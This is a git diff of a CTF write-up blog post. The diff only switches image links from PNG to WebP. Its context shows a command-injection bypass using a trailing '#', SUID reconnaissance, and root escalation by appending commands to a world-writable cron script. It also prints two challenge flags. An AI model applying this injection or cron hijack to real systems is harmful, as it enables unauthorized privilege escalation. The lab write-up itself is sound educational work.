@@ -36,7 +36,7 @@ ping: ⇒ missing cap_net_raw+p capability or setuid?
 
 Submitting `id` directly was rejected with an "invalid command" error, confirming the app validated the command name before execution. Common shell separators were blocked too — sending `ping -c 1 127.0.0.1; id` produced only the ping error with no `id` output.
 
-![Command bypass using # trick](/img/posts/kpmg-ctf-2026-01_command_bypass.png)
+![Command bypass using # trick](/img/posts/kpmg-ctf-2026-01_command_bypass.webp)
 
 ---
 
@@ -87,7 +87,7 @@ uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
 
 Reading `/entrypoint.sh` showed the user flag was written to `/home/appuser/user.txt` with mode `644` at container startup.
 
-![Flag location from entrypoint](/img/posts/kpmg-ctf-2026-02_flag_location_entrypoint.png)
+![Flag location from entrypoint](/img/posts/kpmg-ctf-2026-02_flag_location_entrypoint.webp)
 
 ```text
 ping -V #
@@ -100,7 +100,7 @@ cat /home/appuser/user.txt #
 KPMG_CTF{5NGFEr8rYdC-SkS6lM0vQnwHTHq0mKr72f8_WeMZcMIN}
 ```
 
-![User flag](/img/posts/kpmg-ctf-2026-08_healthy_flag1.png)
+![User flag](/img/posts/kpmg-ctf-2026-08_healthy_flag1.webp)
 
 ---
 
@@ -116,11 +116,11 @@ id #
 find / -perm -4000 -type f 2>/dev/null #
 ```
 
-![Recon as appuser](/img/posts/kpmg-ctf-2026-03_p2_recon.png)
+![Recon as appuser](/img/posts/kpmg-ctf-2026-03_p2_recon.webp)
 
 The SUID search found `/usr/sbin/exim4`. Its command-line options required administrative privileges, so it was a dead end for this instance.
 
-![Finding writable locations](/img/posts/kpmg-ctf-2026-04_p2_find_writable.png)
+![Finding writable locations](/img/posts/kpmg-ctf-2026-04_p2_find_writable.webp)
 
 ### Cron Analysis
 
@@ -138,7 +138,7 @@ Checking `/etc/crontab` revealed the real attack surface:
 
 The health check script ran as **root every ~10 seconds**. Checking its permissions:
 
-![Crontab contents](/img/posts/kpmg-ctf-2026-05_p2_crontab.png)
+![Crontab contents](/img/posts/kpmg-ctf-2026-05_p2_crontab.webp)
 
 ```text
 -rwxrwxrwx 1 root root ... /opt/healthcheck.sh
@@ -164,7 +164,7 @@ ping -V #
 printf '\n/bin/cp /root/root.txt /tmp/rootflag\n/bin/chmod 644 /tmp/rootflag\n' >> /opt/healthcheck.sh #
 ```
 
-![Exploiting the cron job](/img/posts/kpmg-ctf-2026-06_p2_exploit_cron.png)
+![Exploiting the cron job](/img/posts/kpmg-ctf-2026-06_p2_exploit_cron.webp)
 
 After waiting for the next cron execution (~10 seconds), we read the copy:
 
@@ -173,7 +173,7 @@ ping -V #
 cat /tmp/rootflag #
 ```
 
-![Root flag](/img/posts/kpmg-ctf-2026-07_p2_root_flag.png)
+![Root flag](/img/posts/kpmg-ctf-2026-07_p2_root_flag.webp)
 
 ### Cleanup
 
@@ -191,7 +191,7 @@ rm -f /tmp/rootflag #
 KPMG_CTF{Ymllhoq12FPE13ifQowH_8hOefYuEQMea7bGiq1LOuZE}
 ```
 
-![Root flag confirmed](/img/posts/kpmg-ctf-2026-09_healthy_flag2.png)
+![Root flag confirmed](/img/posts/kpmg-ctf-2026-09_healthy_flag2.webp)
 
 ---
 
